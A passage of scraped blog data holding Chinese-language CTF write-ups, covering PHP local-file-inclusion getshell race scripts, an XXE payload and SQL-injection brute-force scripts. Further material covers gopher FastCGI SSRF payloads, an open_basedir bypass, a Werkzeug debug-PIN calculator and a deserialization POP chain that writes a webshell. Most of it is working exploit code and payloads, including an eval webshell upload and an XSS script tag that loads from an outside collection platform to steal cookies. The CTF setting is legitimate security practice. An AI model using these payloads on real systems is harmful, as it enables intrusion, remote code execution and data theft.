Files\\phpstudy_pro\\Extensions\\tmp\\tmp\\sess_&quot;+PHPSESSIDprint fileNameif __name__ &#x3D;&#x3D; &#39;__main__&#39;: url &#x3D; &quot;&#123;&#125;&#x2F;1.php?file&#x3D;&#123;&#125;&quot;.format(host,fileName) headers &#x3D; &#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;&#39; + PHPSESSID&#125; t &#x3D; threading.Thread(target&#x3D;creatSession,args&#x3D;()) t.setDaemon(True) t.start() while True: res &#x3D; requests.post(url,data&#x3D;&#123;&#39;file&#39;:fileName&#125;,headers&#x3D;headers) if &quot;c4ca4238a0b923820dcc509a6f75849b&quot; in res.content: print(&quot;[*] Get shell success.&quot;) break else: print(&quot;[-] retry.&quot;) phpinfo-LFI 包含临时文件getshell 我们构造一个上传表单的时候,php也会生成一个对应的临时文件,这个文件的相关内容可以在phpinfo()的_FILE[&quot;file&quot;]查看到,但是临时文件很快就会被删除,所以我们赶在临时文件被删除之前,包含临时文件就可以getshell了。 根据phpinfo()中的upload_tmp_dir 直接上脚本，参考链接 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196#!&#x2F;usr&#x2F;bin&#x2F;python# coding&#x3D;utf-8import sysimport threadingimport socketimport urllibdef setup(host, port): TAG&#x3D;&quot;Security Test&quot; PAYLOAD&#x3D;&quot;&quot;&quot;%s\\r&lt;?php $c&#x3D;fopen(&#39;&#x2F;tmp&#x2F;g&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;\\r&quot;&quot;&quot; % TAG REQ1_DATA&#x3D;&quot;&quot;&quot;-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name&#x3D;&quot;dummyname&quot;; filename&#x3D;&quot;test.txt&quot;\\rContent-Type: text&#x2F;plain\\r\\r%s-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot; % PAYLOAD padding&#x3D;&quot;A&quot; * 5000 # 这里需要修改为phpinfo.php的地址 REQ1&#x3D;&quot;&quot;&quot;POST &#x2F;phpinfo.php?a&#x3D;&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP&#x2F;1.1\\rCookie: PHPSESSID&#x3D;q249llvfromc1or39t6tvnun42; othercookie&#x3D;&quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rContent-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ&#x3D;&quot;&quot;&quot;GET &#x2F;lfi.php?file&#x3D;%s HTTP&#x2F;1.1\\rUser-Agent: Mozilla&#x2F;4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r&quot;&quot;&quot; return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d &#x3D; &quot;&quot; while len(d) &lt; offset: d +&#x3D; s.recv(offset) try: i &#x3D; d.find(&quot;[tmp_name] &#x3D;&gt; &quot;) fn &#x3D; urllib.quote(d[i+17:i+31]) # print fn except ValueError: return None s2.send(lfireq % (fn, host)) print lfireq % (fn, host) #debug调试结果 d &#x3D; s2.recv(4096) # print d #查看回显是否成功 s.close() s2.close() if d.find(tag) !&#x3D; -1: return fncounter&#x3D;0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event &#x3D; e self.lock &#x3D; l self.maxattempts &#x3D; m self.args &#x3D; args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;&#x3D; self.maxattempts: return counter+&#x3D;1 try: x &#x3D; phpInfoLFI(*self.args) if self.event.is_set(): break if x: print &quot;\\nGot it! Shell created in &#x2F;tmp&#x2F;g&quot; self.event.set() except socket.error: returndef getOffset(host, port, phpinforeq): &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot; s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d &#x3D; &quot;&quot; while True: i &#x3D; s.recv(4096) d+&#x3D;i if i &#x3D;&#x3D; &quot;&quot;: break # detect the final chunk if i.endswith(&quot;0\\r\\n\\r\\n&quot;): break s.close() i &#x3D; d.find(&quot;[tmp_name] &#x3D;&gt; &quot;) if i &#x3D;&#x3D; -1: raise ValueError(&quot;No php tmp_name in phpinfo output&quot;) print &quot;found %s at %i&quot; % (d[i:i+10],i) # padded up a bit return i+256def main(): print &quot;LFI With PHPInfo()&quot; print &quot;-&#x3D;&quot; * 30 if len(sys.argv) &lt; 2: print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0] sys.exit(1) try: host &#x3D; socket.gethostbyname(sys.argv[1]) except socket.error, e: print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e) sys.exit(1) port&#x3D;80 try: port &#x3D; int(sys.argv[2]) except IndexError: pass except ValueError, e: print &quot;Error with port %d: %s&quot; % (sys.argv[2], e) sys.exit(1) poolsz&#x3D;10 try: poolsz &#x3D; int(sys.argv[3]) except IndexError: pass except ValueError, e: print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e) sys.exit(1) print &quot;Getting initial offset...&quot;, reqphp, tag, reqlfi &#x3D; setup(host, port) offset &#x3D; getOffset(host, port, reqphp) sys.stdout.flush() maxattempts &#x3D; 1000 e &#x3D; threading.Event() l &#x3D; threading.Lock() print &quot;Spawning worker pool (%d)...&quot; % poolsz sys.stdout.flush() tp &#x3D; [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( &quot;\\r% 4d &#x2F; % 4d&quot; % (counter, maxattempts)) sys.stdout.flush() if counter &gt;&#x3D; maxattempts: break print if e.is_set(): print &quot;Woot! \\m&#x2F;&quot; else: print &quot;:(&quot; except KeyboardInterrupt: print &quot;\\nTelling threads to shutdown...&quot; e.set() print &quot;Shuttin&#39; down...&quot; for t in tp: t.join()if __name__&#x3D;&#x3D;&quot;__main__&quot;: main() 根据注释修改一下即可 1python 2.py 59.110.164.44 80 100 LFI + php7崩溃 如果没有phpinfo()获取tmp文件名的时候，我们可以利用php7特有的一个小特性 1http:&#x2F;&#x2F;ip&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x3D;&#x2F;etc&#x2F;passwd 这样会导致php在执行过程中出现segment fault错误，这样如果再此同时上传文件那么临时文件就会被爆存在/tmp目录下，不会被删除。 其实道理很简单，就是这个题目还给你提供了一个列目录的功能，我们生成tmp文件，然后列目录获取文件名就好了 引用一叶飘零师傅的脚本 12345678910111213141516171819import requestsfrom io import BytesIOimport refiles &#x3D; &#123; &#39;file&#39;: BytesIO(&#39;&lt;?php eval($_REQUEST[sky]);&#39;)&#125;url &#x3D; &#39;http:&#x2F;&#x2F;192.168.6.99&#x2F;lfi.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&#39;try: r &#x3D; requests.post(url&#x3D;url, files&#x3D;files, allow_redirects&#x3D;False)except: url &#x3D; &#39;http:&#x2F;&#x2F;192.168.6.99&#x2F;dir.php&#39; r &#x3D; requests.get(url) data &#x3D; re.search(r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;, r.content).group(0) url &#x3D; &quot;http:&#x2F;&#x2F;192.168.6.99&#x2F;lfi.php?file&#x3D;&#x2F;tmp&#x2F;&quot;+data data &#x3D; &#123; &#39;sky&#39;:&quot;phpinfo();&quot; &#125; r &#x3D; requests.post(url&#x3D;url,data&#x3D;data) print r.content 参考链接 https://xz.aliyun.com/t/5535","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"NJUPTCTF-wp","slug":"NJUPTCTF-wp","date":"2019-11-23T02:31:54.000Z","updated":"2020-04-10T13:38:56.292Z","comments":true,"path":"2019/11/23/NJUPTCTF-wp/","link":"","permalink":"https://glotozz.github.io/2019/11/23/NJUPTCTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 Fake XML cookbook True XML cookbook SQLi easyphp replace simple_xss phar matches everything flask_website Fake XML cookbook提示flag在/flag 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; True XML cookbook查看源码发现和上一题是一样的 查看/etc/passwd /etc/hosts 发现存在内网 Linux查看MAC地址方法 /proc/net/arp 再利用ssrf逐一探测 SQLi单引号可以使用\\来转义，or可以采用||，最后的单引号可以用;%00来注释 成功登录，但是没有flag 利用regexp来正则匹配 写个脚本，缺点是无法匹配大小写，还好出题人给我们过了😁 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-# @Time : 2019&#x2F;11&#x2F;23 11:02# @Author : glotozz# @File : 3.py.pyimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;nctf2019.x1ct34m.com:40005&#x2F;index.php&quot;headers &#x3D; &#123; &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0&#39;&#125;def change(b): res1 &#x3D; &quot;&quot; for i in b: res1 +&#x3D; hex(ord(i)) res1 &#x3D; res1.replace(&quot;0x&quot;, &quot;&quot;) res1 &#x3D; &quot;0x&quot; + res1 print(res1) return res1easy_strings &#x3D; [ord(i) for i in &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#39;]tmp &#x3D; 0flag &#x3D; &#39;^&#39;for i in range(1, 100): if tmp &#x3D;&#x3D; 1: break tmp &#x3D; 1 for j in easy_strings: # payload &#x3D; change(chr(j)) # 当时傻了，写了个脚本找出第一个字符的所有可能性，再遍历出最大长度。直接用^匹配开头 payload &#x3D; change(flag + chr(j)) param &#x3D; &quot;&#x2F;**&#x2F;||passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&#123;&#125;;&#123;&#125;&quot;.format(payload, chr(0)) print(param) data &#x3D; &#123; &#39;username&#39;: &#39;\\\\&#39;, &#39;passwd&#39;: param &#125; r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, data&#x3D;data) # print(r.status_code) # print r.content.decode(&#39;utf-8&#39;) if &quot;go back to get the password&quot; in r.content.decode(&quot;utf-8&quot;): print j flag &#x3D; flag + chr(j) tmp &#x3D; 0 breakprint(flag) easyphp本来可以立马做出来的，被自己蠢哭了 利用%0a绕过， $会匹配%0a strtr()是一对一替换 这里是卡了最久的（被自己蠢到了），利用数字爆破0e后面全是数字是爆不出来的，刚好这里有一次替换，那么爆破一个0e后面只存在一个c字母的，写个脚本 我之前做过类似的题： https://glotozz.github.io/2019/08/16/%E5%87%A0%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/ 1234567891011121314str1 &#x3D; &#39;abdef&#39;for i in range(0, 99999999): flag &#x3D; 0 tmp &#x3D; md5(str(i)) if tmp[0:2] &#x3D;&#x3D; &#39;0e&#39;: # print tmp for j in tmp[2:]: # 一开始这里用了tmp[0:],导致第二个e一直被匹配到。。。。 if j in str1: flag &#x3D; 1 break if flag &#x3D;&#x3D; 0: print i break 变量名中的点和空格被转换成下划线。 然后是命令执行 12l$&#123;x&#125;stac f* paylaod 1http:&#x2F;&#x2F;nctf2019.x1ct34m.com:60005&#x2F;?num&#x3D;23333%0A&amp;str1&#x3D;2120624&amp;str2&#x3D;s214587387a&amp;q.w.q&#x3D;tac%20f* replace字符串替换，猜测是/e的代码执行，测试之后发现源码中已经存在/e 发现单引号被过滤，使用chr()绕过即可 差点又去getcwd()什么的了，还好翔哥及时制止😅 simple_xss连续好几次xss没做出来，好像是xss平台的原因，换了个平台收到了 paylaod 1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;xss.pt&#x2F;U3Ni&quot;&gt;&lt;&#x2F;script&gt; 这种情况不行 这种情况okk，但是具体啥原因可能和题目环境有关把，我好像就刷新了几次 替换cookie phar matches everything加文件头+修改后缀绕过 12345678910111213141516&lt;?php class Main &#123; public $url &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub $o &#x3D; new Main(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件 &#x2F;&#x2F;签名自动计算 $phar-&gt;stopBuffering();?&gt; 再把后缀修改为gif即可 构造 123http:&#x2F;&#x2F;nctf2019.x1ct34m.com:40004&#x2F;catchmime.php?careful&#x3D;O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7DPOST:name&#x3D;phar:&#x2F;&#x2F;uploads&#x2F;e05c977c3d.gif&amp;submit&#x3D; 读取/flag发现不存在，emmm卡了好久，翔哥再次指点迷津😁，内网，提示我们they are very close 分别查看/etc/hosts /proc/net/arp 开始SSRF http://10.0.0.2 发现是当前内网地址 http://10.0.0.3 1gopher:&#x2F;&#x2F;10.0.0.3:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 中间花了好多时间，下面这个最香 链接：https://evoa.me/index.php/archives/52/#toc-SSRFGopher 1python 2.py -c &quot;&lt;?php phpinfo();?&gt;&quot; 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 1gopher:&#x2F;&#x2F;10.0.0.3:9000&#x2F;_%01%01%5C%AF%00%08%00%00%00%01%00%00%00%00%00%00%01%04%5C%AF%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication&#x2F;text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B%17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT&#x2F;%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%01%04%5C%AF%00%00%00%00%01%05%5C%AF%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%5C%AF%00%00%00%00 先scandir(&#39;/&#39;) open_basedir()为 /var/www/html,/tmp，考虑绕过 1mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;); 写的脚本中别带双引号，别问我怎么知道的 1python 2.py -c &quot;&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;&quot; 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php flask_website 参考链接： https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg username就是启动这个Flask的用户 ctf /etc/passwd modname为flask.app getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))为Flask getattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径 /usr/local/lib/python3.6/site-packages/flask/app.py uuid.getnode()就是当前电脑的MAC地址，02:42:ac:16:00:02 /sys/class/net/eth0/address str(uuid.getnode())则是mac地址的十进制表达式 2485378220034 get_machine_id() ，不存在尝试&quot;&quot;或者/proc/sys/kernel/random/boot_id 得到21e83dfd-206c-4e80-86be-e8d0afc467a1 死活不行，那么自己复现一下 但是不知道为啥就是不行 最后还是翔哥站了出来👍 一直忽略了最上面的代码，跟着网上的思路走确实找不出错误，其实这个就在最前面，思维僵化说的就是我😑 这里没改源码 注意由于是docker环境，每隔几分钟重启会更新这个id 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits &#x3D; [ &#39;ctf&#39;, # username &#39;flask.app&#39;, # modname &#39;Flask&#39;, # getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),]private_bits &#x3D; [ &#39;2485378220034&#39;,# str(uuid.getnode()), &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address &#39;8dfc43dfd42dfe01a275bef6a09482980d9f245058f769d9dfdfbd848e467241&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit &#x3D; bit.encode(&#39;utf-8&#39;) h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None: h.update(b&#39;pinsalt&#39;) num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size &#x3D;&#x3D; 0: rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;) for x in range(0, len(num), group_size)) break else: rv &#x3D; numprint(rv) PIN码正确后，os模块执行命令 12os.popen(&#39;ls &#x2F;&#39;).read()os.popen(&#39;cat &#x2F;t333333hisss_333111aaaggg.txt&#39;).read() 在做某些题目的时候，感觉自己思维还是太僵化了","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"EIS2019-wp","slug":"EIS2019-wp","date":"2019-11-21T01:15:01.000Z","updated":"2020-03-31T00:47:44.094Z","comments":true,"path":"2019/11/21/EIS2019-wp/","link":"","permalink":"https://glotozz.github.io/2019/11/21/EIS2019-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 ezbypass ezcms ezupload ezwaf ezpop ezjava ezbypass phpversion 7.2.19 蚁剑连上发现当前目录下只有index.php 直接上传exp到/tmp下，再include() exp地址：https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg ezcmsyzmCMS_V5.4框架，搜索历史漏洞，找到一个eval()注入漏洞，但是已被修复 自己本地下个yzmCMS_V5.4框架，利用install时的账号初始密码成功登录后台 先在前端逛逛，看有没有明显利用点（反正之前dedecms是有的😂） 搞不动 ezupload.login.php.bak源码泄露 逻辑漏洞，删除password参数即可登录。 成功登陆后，文件上传的时候加上GIF89a绕过格式以及尝试修改后缀为phtml ezwaf很明显age处时间盲注，绕过waf参考roarctf的http走私 之前写了个用requests的不行，好像是发不了畸形包，翔哥说可以用socket，自己写了个成功了 写个脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/env python2# coding=utf-8import socketimport urllib2import timesocket.setdefaulttimeout(5)flag = \"\"tmp = 0easy_strings = [ord(i) for i in 'abcdefghijklmnopqrstuvwxyz_,']# print(easy_strings)for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # for j in easy_strings: # payload = \"select%20database()\" # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f786464)\" param = \"?age=-1%20or%20if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(5),1)\".format(payload, str(i), str(j)) param = 'POST /' + param + ' HTTP/1.1\\r\\n' print(param) try: sock = socket.socket() sock.connect(('111.186.57.123', 10601)) sock.send(param.encode()) sock.send('Host: 111.186.57.123:10601\\r\\n'.encode()) sock.send('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\\r\\n'.encode()) sock.send('Accept: */*\\r\\n'.encode()) sock.send('Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\r\\n'.encode()) sock.send('Accept-Encoding: gzip, deflate\\r\\n'.encode()) sock.send('Content-Length: 9\\r\\n'.encode()) sock.send('Content-Length: 9\\r\\n'.encode()) sock.send('\\r\\n'.encode()) sock.send('num=111\\r\\n'.encode()) # time.sleep(0.1) buf = sock.recv(1024) # while len(buf): # print buf # buf = s.recv(1024) except: flag += chr(j) tmp = 0 print(flag) breakprint(flag) ezpop这题挺有意思的 把整个代码贴下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131&lt;?phperror_reporting(0);highlight_file(__FILE__);class A&#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = 'flysystem', $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (! $this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B&#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options['prefix'] . $name; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options['serialize']; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool &#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options['expire']; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // 创建失败 &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return true; &#125; return false; &#125;&#125;if (isset($_GET['src']))&#123; highlight_file(__FILE__);&#125;$dir = \"uploads/\";if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[\"data\"]); 大致看了看分析class A中的$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);可以调用class B中的set()方法， 本地测试，发现大致如下 需要绕过exit();?&gt; ，参考之前moctf做过的一道题，利用 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x3D; 总结下POP链 A-&gt;__destruct()-&gt;$this-&gt;save()-&gt;$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire) B-&gt;set() 然后就是一些具体细节 12345&lt;?php$data &#x3D; &#39;aaaPD9waHAgcGhwaW5mbygpOz8+&#39;;$exoire &#x3D; &quot;\\n&quot;;$data &#x3D; &quot;&lt;?php\\n&#x2F;&#x2F;&quot;.sprintf(&#39;%012d&#39;,$expire).&#39;&#39;.$data.&quot;\\n?&gt;&quot;;$result &#x3D; file_put_contents(&#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;6.php&#39;,$data); 本地直接测，发现aaa的时候 还有个坑是serialize()，跟进发现需要我们控制，修改为trim即可 不改的话使用serialize加4个a即可 还曾幻想过动态函数执行，被参数类型给劝退了 最后构造 12345678910111213141516171819202122&lt;?phpclass B&#123; public $options &#x3D; [&#39;serialize&#39;&#x3D;&gt;&#39;trim&#39;,&#39;prefix&#39;&#x3D;&gt;&#39;&#39;];&#125;class A&#123; protected $store; protected $key; protected $expire; public $cache &#x3D; array(&#39;aaaPD9waHAgcGhwaW5mbygpOz8+&#39;); public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null) &#123; $this-&gt;key &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;6.php&#39;; $this-&gt;store &#x3D; new B(); $this-&gt;expire &#x3D; $expire; &#125;&#125;$a &#x3D; new A(new B());echo urlencode(serialize($a)); 本地测试成功👌 还有个小坑，注意目录创建的文件应该要再/uploads/下，不然创建不成功，应该是设置了权限 ezjava直接解压即可， lib文件夹中存在fastjson-1.2.47.jar，很容易想到fastjson =&lt; 1.2.47 反序列化漏洞 发现class文件，利用jd-gui反编译 Index.class User.class 代码不难，根据链接复现即可 参考链接：https://github.com/CaijiOrz/fastjson-1.2.47-RCE 第一步简单检测 centos7安装jdk8 12yum install java-1.8.0-openjdkyum install java-1.8.0-openjdk-devel.x86_64 然后跟着教程走就行","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"ThinkPHP 3.X/5.X order by注入漏洞","slug":"ThinkPHP-3-X-5-X-order-by注入漏洞","date":"2019-11-18T01:40:11.000Z","updated":"2020-03-29T15:05:12.306Z","comments":true,"path":"2019/11/18/ThinkPHP-3-X-5-X-order-by注入漏洞/","link":"","permalink":"https://glotozz.github.io/2019/11/18/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、获取漏洞 二、漏洞实现 三、漏洞分析 一、获取漏洞 二、漏洞实现 三、漏洞分析 参考链接 之前红帽杯的xyhcms利用的就是这个漏洞，主要还是自己对这些历史漏洞不够熟悉，学！ 该漏洞影响ThinkPHP 3.2.3、5.1.22及以下版本。 